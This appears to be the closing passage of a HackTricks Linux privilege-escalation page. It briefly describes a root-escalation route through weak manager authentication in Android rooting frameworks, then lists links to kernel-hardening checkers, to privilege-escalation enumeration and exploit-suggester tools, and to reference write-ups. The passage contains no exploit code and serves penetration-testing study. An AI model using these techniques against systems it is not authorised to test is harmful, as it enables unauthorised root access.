Android rooting frameworks 常常 hook 一个 syscall，将特权的 kernel 功能暴露给 userspace 的 manager。弱的 manager 认证（例如基于 FD-order 的签名校验或糟糕的密码方案）可能允许本地应用冒充该 manager，从而在已被 root 的设备上升级为 root。更多信息和利用细节请查看：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
